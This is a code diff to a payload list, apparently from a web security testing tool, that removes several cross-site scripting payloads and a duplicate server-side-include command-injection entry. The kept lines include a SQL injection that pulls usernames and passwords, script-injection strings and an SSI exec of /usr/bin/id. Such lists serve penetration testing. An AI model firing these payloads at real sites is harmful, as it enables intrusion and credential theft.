@@ -240,54 +240,9 @@ let defaults = {
       "payload":"' UNION SELECT username, password FROM users --"
    },
    {
-      "id":"52",
-      "parentId":"xss",
-      "payload":"<img src=x onerror=prompt(1)>"
-   },
-   {
-      "id":"53",
-      "parentId":"xss",
-      "payload":"<frameset onload=javascript:alert(1)>"
-   },
-   {
-      "id":"54",
-      "parentId":"xss",
-      "payload":"\"--!><Svg/Onload=confirm`cookie`>\""
-   },
-   {
-      "id":"55",
-      "parentId":"xss",
-      "payload":"\";alert('XSS');//"
-   },
-   {
-      "id":"56",
-      "parentId":"xss",
-      "payload":"\"><img src onerror=alert(1)>"
-   },
-   {
-      "id":"57",
-      "parentId":"xss",
-      "payload":"\"autofocus onfocus=alert(1)//"
-   },
-   {
-      "id":"58",
-      "parentId":"xss",
-      "payload":"</script><script>alert(1)</script>"
-   },
-   {
-      "id":"59",
-      "parentId":"xss",
-      "payload":"'-alert(1)-'"
-   },
-   {
       "id":"60",
       "parentId":"xss",
       "payload":"'-alert(1)//"
-   },
-   {
-      "id":"61",
-      "parentId":"xss",
-      "payload":"javascript:alert(1)"
    },
    {
       "id":"62",
@@ -736,11 +691,6 @@ let defaults = {
    },
    {
       "id":"151",
-      "parentId":"command-injection-linux",
-      "payload":"&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;"
-   },
-   {
-      "id":"152",
       "parentId":"command-injection-linux",
       "payload":"&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;"
    },
